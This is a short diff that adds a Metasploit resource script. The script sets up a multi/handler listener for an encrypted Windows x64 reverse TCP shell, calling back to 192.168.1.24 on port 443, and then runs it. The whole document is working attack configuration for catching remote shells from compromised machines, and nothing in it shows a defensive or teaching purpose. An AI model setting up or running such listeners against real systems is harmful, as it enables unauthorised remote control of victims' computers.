@@ -1,0 +1,5 @@
+use exploit/multi/handler
+set payload windows/x64/encrypted_shell_reverse_tcp
+set LHOST 192.168.1.24 
+set LPORT 443
+run
